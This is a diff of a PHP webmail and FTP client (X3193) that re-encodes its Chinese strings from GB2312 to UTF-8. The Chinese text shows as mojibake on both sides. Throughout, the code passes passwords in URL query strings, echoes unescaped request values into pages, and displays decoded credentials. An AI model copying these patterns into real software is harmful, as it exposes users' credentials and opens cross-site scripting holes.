+                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 break;
         case "mail.list":
                 if ($debug == 1){
@@ -5118,21 +6746,21 @@ function selitemall()
 }
 function delitem()
 {
- if(!confirm('È·¶¨É¾³ıÑ¡ÖĞµÄÎÄ¼şÂğ?')) return;
+ if(!confirm('ç¡®å®šåˆ é™¤é€‰ä¸­çš„æ–‡ä»¶å—?')) return;
  document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
  document.ftp.submit();
 }
 
 function rename(oldName)
 {
-toname=prompt('½«ÎÄ¼ş '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†æ–‡ä»¶ '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
 
 function renamed(oldName)
 {
-toname=prompt('½«Ä¿Â¼ '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†ç›®å½• '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
@@ -5143,7 +6771,7 @@ function encodeuri(str){
         newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
         newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
         newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
-        // js replace µÄÄ£Ê½ÎŞÒıºÅ£¨Ë«µ¥£©£¬ÌØÊâ×Ö·ûĞè¼ÓĞ±¸Ü£¬¿ÉÒÔµ¥¶ÀÌæ»»Ä³¸ö×Ö·û¡£
+        // js replace çš„æ¨¡å¼æ— å¼•å·ï¼ˆåŒå•ï¼‰ï¼Œç‰¹æ®Šå­—ç¬¦éœ€åŠ æ–œæ ï¼Œå¯ä»¥å•ç‹¬æ›¿æ¢æŸä¸ªå­—ç¬¦ã€‚
         return(newstr);
 }
 </script>       
@@ -5167,7 +6795,7 @@ function encodeuri(str){
                 //echo $endid;          
                 ?>
         <tr class="tdtbg">
-                <td align="left">&nbsp;ÓÊÏä¹ÜÀí -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"¸ùÄ¿Â¼":mb_convert_encoding(trim(request("mailbox")), "GB2312", "UTF7-IMAP");?></td>
+                <td align="left">&nbsp;é‚®ç®±ç®¡ç† -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"æ ¹ç›®å½•":mb_convert_encoding(trim(request("mailbox")), "GB2312", "UTF7-IMAP");?></td>
         </tr>
 </table>
                 <?php 
@@ -5180,16 +6808,16 @@ function encodeuri(str){
 
                         <tr class="tdbg">
                                 <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
-                                <td align="center">±êÌâ</td>
-                                <td align="center" width="25%">·¢¼şÈË</td>
-                                <td align="center" width="30%">ËÑË÷ ´´½¨ É¾³ı</td>
+                                <td align="center">æ ‡é¢˜</td>
+                                <td align="center" width="25%">å‘ä»¶äºº</td>
+                                <td align="center" width="30%">æœç´¢ åˆ›å»º åˆ é™¤</td>
                         </tr>
                 <?php 
                 $i = 0;
                 for($i=$mail_count-$strpagesize*($page-1);$i>$endid;$i--){
                 
                         if ($debug == 1){
-                                $mail_subject = array('0' => array('charset' => 'gb2312','text' => '¶«ÑÇÒøĞĞÏµÍ³Éı¼¶¹«¸æ'));
+                                $mail_subject = array('0' => array('charset' => 'gb2312','text' => 'ä¸œäºšé“¶è¡Œç³»ç»Ÿå‡çº§å…¬å‘Š'));
                                 $mailsubject = "";
                                 for($j=0;$j<count($mail_subject);$j++){
                                         if($j!=count($mail_subject)-1){
@@ -5201,7 +6829,7 @@ function encodeuri(str){
                                 }
                         }
                         else{
-                                $list = imap_headerinfo($mbox,$i,1024,1024);//·¢¼şÈË×Ö·û³¤¶È£¬Ö÷Ìâ×Ö·û³¤¶È
+                                $list = imap_headerinfo($mbox,$i,1024,1024);//å‘ä»¶äººå­—ç¬¦é•¿åº¦ï¼Œä¸»é¢˜å­—ç¬¦é•¿åº¦
                                 $mail_subject = imap_mime_header_decode($list->fetchsubject);
                                 //print_r($mail_subject);
                                 //return;
@@ -5222,7 +6850,7 @@ function encodeuri(str){
                                 <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $i;?>" /></td>
                                 <td align="center"><?php echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailnum=".$i."&mailbox=".encodeuri(trim(request("mailbox")))."'>".$mailsubject."</a>";?></td>
                                 <td align="center"><?php echo $mailfrom;?></td>
-                                <td align="center">ËÑË÷ Ìí¼Ó É¾³ı Åä¶î ¸üÃû</td>
+                                <td align="center">æœç´¢ æ·»åŠ  åˆ é™¤ é…é¢ æ›´å</td>
                         </tr>
                         <?php 
                 }
@@ -5238,13 +6866,13 @@ function encodeuri(str){
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdbg">
-                <td align="center" colspan="3"> ¹² <?php  echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3"> å…± <?php  echo $totalpage;?> é¡µ ç¬¬  
                 <?php 
-                echo $page." Ò³ ".$sCrLf;
+                echo $page." é¡µ ".$sCrLf;
                 if (floor($page)>1)
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>ÉÏÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>ä¸Šä¸€é¡µ</a> ";
                 if (floor($page)>0 && floor($page)<floor($totalpage))
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>ÏÂÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>ä¸‹ä¸€é¡µ</a> ";
 
                 $gotopage = New PageChange();
                 $gotopage->CallPageChange();
@@ -5253,7 +6881,7 @@ function encodeuri(str){
         </tr>   
 </table>
 <?php 
-                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(trim(request("mailbox")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(trim(request("mailbox")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 break;
         case "robot.modify":
                 break;
@@ -5288,9 +6916,9 @@ function changeimg()
         <tr class="tdtbg" height="35" valign="center">
                 <td align="center" valign="center" id="openshift">
                         <form action="<?php echo ScriptPath();?>?api=openshift&action=<?php echo encodeuri("domain.list");?>&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="google">
-                        &nbspÓÃ»§Ãû£º<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
-                        &nbspÃÜÂë£º<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
-                        &nbspÑéÖ¤Âë£º<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
+                        &nbspç”¨æˆ·åï¼š<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
+                        &nbspå¯†ç ï¼š<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
+                        &nbspéªŒè¯ç ï¼š<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
         </tr>   
@@ -5305,7 +6933,7 @@ $style->footer();
 
 <?php 
 function imap() {
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 ?>
 <head>
@@ -5314,7 +6942,7 @@ $style = new css();
 $style->ico();
 $style->title("X3193 - IMAP");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -5328,9 +6956,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -5344,7 +6972,7 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
 </table>
 <?php 
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('pagesize')) == "")
         $pagesize = 30;
 elseif (trim(request('pagesize')) > 50)
@@ -5374,21 +7002,21 @@ switch (trim(request('action'))) {  // case start
         case "mailbox.list":
                 if (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                         if (trim($_POST["server"]) == "" || trim($_POST["uname"]) == "" || trim($_POST["pwd"]) == ""){
-                                AlertBack("·şÎñÆ÷Ãû¡¢ÓÃ»§Ãû»òÃÜÂëÎª¿Õ£¡" , 1);
+                                AlertBack("æœåŠ¡å™¨åã€ç”¨æˆ·åæˆ–å¯†ç ä¸ºç©ºï¼" , 1);
                                 break;
                         }
                         else{
-                                AlertBack("·şÎñÆ÷Ãû¡¢ÓÃ»§Ãû»òÃÜÂëÎª¿Õ£¡" , 2);
+                                AlertBack("æœåŠ¡å™¨åã€ç”¨æˆ·åæˆ–å¯†ç ä¸ºç©ºï¼" , 2);
                                 break;
                         }
                 }
                 If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                         if (trim(request("checkcode")) != ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                 break;
                         }       
                         elseif (trim(request("checkcode")) == ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                 break;
                         }               
                 }
@@ -5543,7 +7171,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         }                       
                 }
                 else{
-                        AlertBack("ÔİÊ±ÎŞ·¨½ÓÈë¸ÃÀà·şÎñÆ÷£¡" , 2);
+                        AlertBack("æš‚æ—¶æ— æ³•æ¥å…¥è¯¥ç±»æœåŠ¡å™¨ï¼" , 2);
                         break;
                 }
 
@@ -5551,7 +7179,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                 return;
                 if (is_array($list)) {
                         //foreach ($list as $val) {
-                        //      print_r(mb_convert_encoding($val, "GB2312", "UTF7-IMAP") . "\r\n");//UTF-7¸ñÊ½:&ftyug-
+                        //      print_r(mb_convert_encoding($val, "GB2312", "UTF7-IMAP") . "\r\n");//UTF-7æ ¼å¼:&ftyug-
                         //}
 
                         //foreach ($list as $key => $val) {
@@ -5565,7 +7193,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         //print_r($list);                       
                 }       
                 else {
-                        AlertBack("ÓÊÏäÁĞ±íÊä³öÊ§°Ü£¡".imap_last_error() , 2);
+                        AlertBack("é‚®ç®±åˆ—è¡¨è¾“å‡ºå¤±è´¥ï¼".imap_last_error() , 2);
                         break;
                 }
                 //return;
@@ -5584,21 +7212,21 @@ function selitemall()
 }
 function delitem()
 {
- if(!confirm('È·¶¨É¾³ıÑ¡ÖĞµÄÎÄ¼şÂğ?')) return;
+ if(!confirm('ç¡®å®šåˆ é™¤é€‰ä¸­çš„æ–‡ä»¶å—?')) return;
  document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
  document.ftp.submit();
 }
 
 function rename(oldName)
 {
-toname=prompt('½«ÎÄ¼ş '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†æ–‡ä»¶ '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
 
 function renamed(oldName)
 {
-toname=prompt('½«Ä¿Â¼ '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†ç›®å½• '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
@@ -5609,7 +7237,7 @@ function encodeuri(str){
         newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
         newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
         newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
-        // js replace µÄÄ£Ê½ÎŞÒıºÅ£¨Ë«µ¥£©£¬ÌØÊâ×Ö·ûĞè¼ÓĞ±¸Ü£¬¿ÉÒÔµ¥¶ÀÌæ»»Ä³¸ö×Ö·û¡£
+        // js replace çš„æ¨¡å¼æ— å¼•å·ï¼ˆåŒå•ï¼‰ï¼Œç‰¹æ®Šå­—ç¬¦éœ€åŠ æ–œæ ï¼Œå¯ä»¥å•ç‹¬æ›¿æ¢æŸä¸ªå­—ç¬¦ã€‚
         return(newstr);
 }
 </script>       
@@ -5633,7 +7261,7 @@ function encodeuri(str){
                 //echo $endid;          
                 ?>
         <tr class="tdtbg">
-                <td align="left">&nbsp;ÓÊÏä¹ÜÀí -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"¸ùÄ¿Â¼":trim(request("mailbox"));?></td>
+                <td align="left">&nbsp;é‚®ç®±ç®¡ç† -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"æ ¹ç›®å½•":trim(request("mailbox"));?></td>
         </tr>
 </table>
                 <?php 
@@ -5647,9 +7275,9 @@ function encodeuri(str){
                 ?>
                         <tr class="tdbg">
                                 <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
-                                <td align="center" width="25%">ÎÄ¼ş¼Ğ</td>
-                                <td align="center">ÈİÁ¿ - ×îĞÂ - Î´¶Á</td>
-                                <td align="center" width="30%">ËÑË÷ ´´½¨ É¾³ı</td>
+                                <td align="center" width="25%">æ–‡ä»¶å¤¹</td>
+                                <td align="center">å®¹é‡ - æœ€æ–° - æœªè¯»</td>
+                                <td align="center" width="30%">æœç´¢ åˆ›å»º åˆ é™¤</td>
                         </tr>
                 <?php 
                 for($i = $strpagesize*($page-1);$i <= $endid;$i++){
@@ -5666,7 +7294,7 @@ function encodeuri(str){
                                 <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo preg_replace("/{[^{}]+}(.*)/", "\$1", mb_convert_encoding($list[$i], "GB2312", "UTF7-IMAP"));?>" /></td>
                                 <td align="center"><?php echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(preg_replace("/{[^{}]+}(.*)/", "\$1", $list[$i]))."'>".preg_replace("/{[^{}]+}(.*)/", "\$1", mb_convert_encoding($list[$i], "GB2312", "UTF7-IMAP"))."</a>";?></td>
                                 <td align="center"><?php echo (($status->messages=="")?"0":$status->messages).' - '.(($status->recent=="")?"0":$status->recent).' - '.(($status->unseen=="")?"0":$status->unseen);?></td>
-                                <td align="center">ËÑË÷ Ìí¼Ó É¾³ı Åä¶î ¸üÃû</td>
+                                <td align="center">æœç´¢ æ·»åŠ  åˆ é™¤ é…é¢ æ›´å</td>
                         </tr>
                         <?php 
                 }
@@ -5682,13 +7310,13 @@ function encodeuri(str){
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdbg">
-                <td align="center" colspan="3"> ¹² <?php  echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3"> å…± <?php  echo $totalpage;?> é¡µ ç¬¬  
                 <?php 
-                echo $page." Ò³ ".$sCrLf;
+                echo $page." é¡µ ".$sCrLf;
                 if (floor($page)>1)
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>ÉÏÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>ä¸Šä¸€é¡µ</a> ";
                 if (floor($page)>0 && floor($page)<floor($totalpage))
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>ÏÂÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>ä¸‹ä¸€é¡µ</a> ";
 
                 $gotopage = New PageChange();
                 $gotopage->CallPageChange();
@@ -5697,7 +7325,7 @@ function encodeuri(str){
         </tr>   
 </table>
 <?php 
-                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 break;
         case "mail.list":
                 if ($debug == 1){
@@ -5722,21 +7350,21 @@ function selitemall()
 }
 function delitem()
 {
- if(!confirm('È·¶¨É¾³ıÑ¡ÖĞµÄÎÄ¼şÂğ?')) return;
+ if(!confirm('ç¡®å®šåˆ é™¤é€‰ä¸­çš„æ–‡ä»¶å—?')) return;
